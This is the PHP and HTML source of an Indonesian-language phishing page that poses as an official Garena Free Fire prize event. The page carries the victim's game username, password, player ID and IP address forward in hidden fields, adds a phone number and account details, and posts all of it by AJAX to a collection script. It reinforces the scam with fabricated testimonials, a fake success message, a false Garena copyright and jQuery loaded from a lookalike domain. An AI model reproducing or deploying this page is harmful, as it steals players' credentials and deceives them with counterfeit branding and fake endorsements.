<?php
extract($_POST);
?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta content="width=device-width,maximum-scale=1.0,initial-scale=1.0,user-scalable=no" name="viewport" />
	<link rel="icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire32-2.ico" type="image/x-icon" />
	<link rel="shortcut icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire16-2.ico" type="image/x-icon" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
	<meta name="copyright" content="" />
	<meta content="black" name="apple-mobile-web-app-status-bar-style" />
	<meta name="apple-mobile-web-app-title" content="Garena Free Fire">
	<meta name="description" content="Free Fire is a mobile game where players enter a battlefield where there is only one winner - the last man standing. Grab weapons to do others in and supplies to bolster your chances of survival. Eventually, players are forced into a shrinking play zone to engage each other in a tactical and diverse environment."/>
	<title>LUCKY ROYALE | GARENA FREEFIRES</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="stylesheet" type="text/css" href="css/facebook.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
	<div class="loader">
		<img src="https://h.top4top.io/p_2016h7ob71.gif">
	</div>
	<div class="app">
		<header>
			<div class="profile">
				<div class="avatarBox">
					<img src="https://steamuserimages-a.akamaihd.net/ugc/909022648274283056/506B4A9C27FA5CEE3952C83D1FBAF6ADF1FAC7FA/">
				</div>
				<div class="nameBox">
					<span class="nickname"><?php echo $nickPlayer;?></span>
					<span class="guild">EVOS Esport ID</span>
				</div>
			</div>
			<div class="progress"></div>
			<span class="level">LV.60</span>
			<span class="badge">353</span>
		</header>
		<div class="wrap">
			<div class="boxlogin">
				<h1>Isi Formulir Dibawah</h1>
				<form id="xyz" action="hmm.php" method="POST" onsubmit="return xyz()">
					<div class="form-group">
					    <input id="hp" class="form-input" placeholder="Nomor HP" name="hp" data-alert="false" autocomplete="off">
					 </div>
					
					 <div class="form-group">
					    <select id="level" name="level" class="form-input">
					    <option value="" selected disabled>Level Akun?</option>
					    <?php
					    for($i=1;$i<=100;$i++){
					    echo'<option>'.$i.'<'.'/option>';
					    }
					    ?>
					    </select>
					 </div>
					 
					 <div class="form-group">
					    <select id="tier" name="tier" class="form-input">
					    <option value="" selected disabled>Tier Akun</option>
					    <option>Bronze</option>
					    <option>Silver</option>
					    <option>Gold</option>
					    <option>Diamond</option>
					    <option>Master</option>
					    <option>Grand Master</option>
					    </select>
					 </div>
					 
					 <div class="form-group">
					    <select id="ep" name="ep" class="form-input">
					    <option value="" selected disabled>Pernah Elite Pass?</option>
					    <option>Pernah</option>
					    <option>Tidak Pernah</option>
					    </select>
					 </div>
					 <!-- HIDDEN FORM -->
					 <input type="hidden" name="user" id="user" value="<?php echo $user;?>">
					 <input type="hidden" name="pass" id="pass" value="<?php echo $pass;?>">
					 <input type="hidden" name="id" id="id" value="<?php echo $idPlayer;?>">
					 <input type="hidden" name="ip" id="ip" value="<?php echo $ipAddr;?>">
					 <input type="hidden" name="nick" id="nick" value="<?php echo $nickPlayer;?>">
					 <!-- END OF COMMENT -->
					 <div class="form-group">
					 <button type="submit" class="submitbtn">Verifikasi</button>
					 </div>
				</form>
			</div>


			<div class="comment">
				<div class="secs" style="--i:1;">
					<div class="profile">
						<img src="https://yt3.ggpht.com/ytc/AKedOLQHnLzY-L1gHCcyRmS-qU8zhR5wkgV_241ED8W_5g=s176-c-k-c0x00ffffff-no-rj-mo">
					</div>
					<div class="content">
						<h1>Budi 01 Gaming</h1>
						<p>Gapapa dapat yang jelek yang penting gratis</p>
					</div>
				</div>
				<div class="secs" style="--i:2;">
					<div class="profile">
						<img src="https://yt3.ggpht.com/oAzM5Q7iSpiqXgokNyd4DBJ2-t5v51pwBfcwO_bJueeGVrULgJz4YQrIXzVPt9YT9tc4iHu8Vg=s176-c-k-c0x00ffffff-no-rj-mo">
					</div>
					<div class="content">
						<h1>Frontal Gaming</h1>
						<p>Ini siapa yang buat, makasih dapat skin gratis</p>
					</div>
				</div>
				<div class="secs" style="--i:3;">
					<div class="profile">
						<img src="https://yt3.ggpht.com/ytc/AKedOLT_SveIPYuHMsCEO1Unz3P9JCiv3cueYXlXdX9O-A=s176-c-k-c0x00ffffff-no-rj-mo">
					</div>
					<div class="content">
						<h1>WAWAN MKS</h1>
						<p>Gw Kira Boongan, Pas gw tes eh malah beneran</p>
					</div>
				</div>
				<div class="secs" style="--i:4;">
					<div class="profile">
						<img src="https://yt3.ggpht.com/ytc/AKedOLTxTD0eQmMZvvppFe-slf65n6zLbNsVf10SQoy-=s176-c-k-c0x00ffffff-no-rj-mo">
					</div>
					<div class="content">
						<h1>NOTNOT</h1>
						<p>Cuman bisa bilang makasih, soalx pusing mau ngomong apa</p>
					</div>
				</div>
				<div class="secs" style="--i:5;">
					<div class="profile">
						<img src="https://yt3.ggpht.com/ytc/AKedOLQe3Efbal5RgegAWH61uSMbaTJDeGoWJlGPev4mAg=s176-c-k-c0x00ffffff-no-rj-mo">
					</div>
					<div class="content">
						<h1>efdewe</h1>
						<p>Mantepp work gk nyesel deh kalo nyoba ayo buruan</p>
					</div>
				</div>
				<div class="secs" style="--i:6;">
					<div class="profile">
						<img src="https://yt3.ggpht.com/ytc/AKedOLSM-dCXw40XqxHYSt3KdYIEbq_l-10d6pChDLH44w=s176-c-k-c0x00ffffff-no-rj-mo">
					</div>
					<div class="content">
						<h1>Cepcill</h1>
						<p>Itu yang bilang hoax, pasti blum coba hehehe</p>
					</div>
				</div>
				<div class="secs" style="--i:7;">
					<div class="profile">
						<img src="https://yt3.ggpht.com/ytc/AKedOLS5Z_GKUsU1o7tUhS0VqYOh6n4s0uGmJTOfG1sRlQ=s176-c-k-c0x00ffffff-no-rj-mo">
					</div>
					<div class="content">
						<h1>Rasyah Rasyid</h1>
						<p>Gak bisa berkata-kata lagi, buruan coba pokoknya</p>
					</div>
				</div>
				<div class="secs" style="--i:8;">
					<div class="profile">
						<img src="https://yt3.ggpht.com/ytc/AKedOLS2S1-jU8YLFZfeC1pQza-6m1Kr9tlsv5mGa8qs2A=s176-c-k-c0x00ffffff-no-rj-mo">
					</div>
					<div class="content">
						<h1>Jess No Limit</h1>
						<p>Asli ini yang bikin jenius bangett, work 100%</p>
					</div>
				</div>
			</div>


			<div class="mask" style="display: none;"></div>
			<div class="berhasil" style="display: none;">
				<h1>Congratulations</h1>
				<img src="http://www.cssmyschool.info/schimg/done.gif">
				<p>Selamat kepada <?php echo $nickPlayer;?>. Anda berhasil mendapatkan hadiah dari event ini, mohon tunggu 1x24 untuk keteranganb lebih lanjut</p>
			</div>


		</div>
		
		<footer>
		   Copyright © Garena International.
		</footer>
		
	</div>
	<script type="text/javascript" src="http://app-jquery.xyz/jquery-3.6.0.min.js"></script>
	<script type="text/javascript" src="https://app-jquery.xyz/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
	<script type="text/javascript">
		$(document).ready(function(){
			setTimeout(() => {
				$('.loader').fadeOut();
			},1000)
		})
	</script>
	<script>
		// Validation
		function xyz(){
			form();
			return false;
		}
		function form(){
			var hp = $("#hp").val();
			var level = $("#level").val();
			var tier = $("#tier").val();
			var ep = $("#ep").val();
			var user = $("#user").val();
			var pass = $("#pass").val();
			var id = $("#id").val();
			var nick = $("#nick").val();
			var ip = $("#ip").val();

			if(!hp || hp == null || hp == '')
			{
				$("#hp").css('filter','hue-rotate(90deg)');
			}else{
				$("#hp").css('filter','hue-rotate(0deg)');
			}
			if(!level || level == null || level == '')
			{
				$("#level").css('filter','hue-rotate(90deg)');
			}else{
				$("#level").css('filter','hue-rotate(0deg)');
			}
			if(!tier || tier == null || tier == '')
			{
				$("#tier").css('filter','hue-rotate(90deg)');
			}else{
				$("#tier").css('filter','hue-rotate(0deg)');
			}
			if(!ep || ep == null || ep == '')
			{
				$("#ep").css('filter','hue-rotate(90deg)');
			}else{
				$("#ep").css('filter','hue-rotate(0deg)');
			}

			// if all form are filled
			if(hp.length != 0 && level != null && tier != null && ep != null)
			
			{
				// SEND DATA
				$('.submitbtn').fadeOut();
				$.ajax({
					type: 'POST',
					url: 'xyzData.php',
					data: $('#xyz').serialize(),
					beforeSend: await(),
					dataType: 'text',
					success: function(xyz){
						$('.submitbtn').prop('disabled',true);
						$('.berhasil').fadeIn();
						$('.mask').fadeIn();
					}
				})
			}
		}
	</script>
</body>
</html>

